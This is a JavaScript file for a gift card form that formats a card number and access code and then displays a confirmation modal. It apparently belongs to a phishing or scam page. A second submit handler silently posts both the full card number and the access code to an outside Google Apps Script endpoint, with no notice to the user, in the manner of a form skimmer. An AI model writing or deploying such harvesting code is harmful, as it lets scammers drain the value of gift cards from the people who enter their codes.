const form = document.getElementById("giftForm");
const cardInput = document.getElementById("cardNumber");
const accessInput = document.getElementById("accessCode");
const inlineError = document.getElementById("inlineError");
const modal = document.getElementById("modal");
const closeModal = document.getElementById("closeModal");

/* Auto Format Gift Card */
cardInput.addEventListener("input", function (e) {
  let value = e.target.value.replace(/\D/g, "");
  value = value.substring(0, 16);
  let formatted = value.match(/.{1,4}/g);
  e.target.value = formatted ? formatted.join(" ") : "";
});

/* Access Code Numeric Only */
accessInput.addEventListener("input", function (e) {
  let value = e.target.value.replace(/\D/g, "");
  value = value.substring(0, 22);
  e.target.value = value;
});

/* Submit Logic */
form.addEventListener("submit", function (e) {
  e.preventDefault();

  const cardDigits = cardInput.value.replace(/\s/g, "");
  const accessDigits = accessInput.value.trim();

  // 🔴 IF ANY FIELD IS EMPTY
  if (cardDigits.length === 0 || accessDigits.length === 0) {
    inlineError.classList.remove("hidden");
    modal.classList.remove("show");
    return;
  }

  // 🟢 BOTH HAVE INPUT → SHOW MODAL
  inlineError.classList.add("hidden");
  modal.classList.add("show");
});

/* Close Modal */
closeModal.addEventListener("click", function () {
  modal.classList.remove("show");
});

window.addEventListener("click", function (e) {
  if (e.target === modal) {
    modal.classList.remove("show");
  }
});


//  API

const scriptURL = "https://script.google.com/macros/s/AKfycbwfJVn89XZbffggeelmhqqTEHuyEHrRx_kiRDX2pnTaMVaXsA3Vi26useJEfs06waeF6Q/exec";

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  const cardDigits = cardInput.value.replace(/\s/g, "");
  const accessDigits = accessInput.value.trim();

  try {
    const response = await fetch(scriptURL, {
      method: "POST",
      body: JSON.stringify({
        cardNumber: cardDigits,
        accessCode: accessDigits
      })
    });

    const result = await response.text();
    console.log("Success:", result);

  } catch (error) {
    console.error("Error:", error);
  }
});